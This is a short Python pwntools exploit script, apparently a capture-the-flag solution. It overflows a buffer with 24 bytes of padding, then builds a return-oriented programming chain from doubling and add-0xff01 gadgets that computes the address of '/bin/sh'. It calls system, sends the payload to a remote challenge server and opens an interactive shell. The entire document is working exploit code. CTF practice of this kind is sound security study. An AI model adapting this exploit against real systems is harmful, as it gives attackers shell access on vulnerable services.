from pwn import *

addFF01_gadget = 0x401209
double_gadget = 0x40120d
ret_gadget = 0x40120f
system_call = 0x4011fb
binsh = 0x402036

bits = bin(binsh * pow(0xff01ff01, -1, 2**32) % 2**32)[2:]
payload = b'A' * 24
payload += b''.join([p64(x) for bit in bits for x in [double_gadget] + [addFF01_gadget][:int(bit)]])
payload += p64(ret_gadget) + p64(system_call)

with remote('challenges.oceaniacc.com', 6001) as io:
    io.sendline(payload)
    io.interactive()